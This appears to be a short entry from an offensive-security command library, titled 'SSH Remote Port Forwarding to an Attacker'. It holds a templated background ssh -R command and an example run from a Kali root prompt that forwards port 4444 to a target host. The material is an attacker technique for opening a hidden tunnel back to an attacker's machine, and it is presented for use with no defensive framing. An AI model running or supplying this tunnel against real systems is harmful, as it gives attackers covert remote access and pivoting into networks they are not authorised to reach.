---
id: cf3e88ac-955b-43c5-a061-8f464c850ae7
name: SSH Remote Port Forwarding to an Attacker
type: command
executor: bash
data: ssh -f -N -R $_REMOTE_PORT:$_REMOTE_IP:$_LOCAL_PORT $_USER@$_TARGET_IP
output: root@kali:~# ssh -f -N -R 4444:127.0.0.1:4444 root@10.10.10.10
created_at: '2019-10-02T01:10:12.258287+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SSH Remote Port Forwarding to an Attacker

```bash
ssh -f -N -R $_REMOTE_PORT:$_REMOTE_IP:$_LOCAL_PORT $_USER@$_TARGET_IP
```

## Expected Output

```
root@kali:~# ssh -f -N -R 4444:127.0.0.1:4444 root@10.10.10.10
```


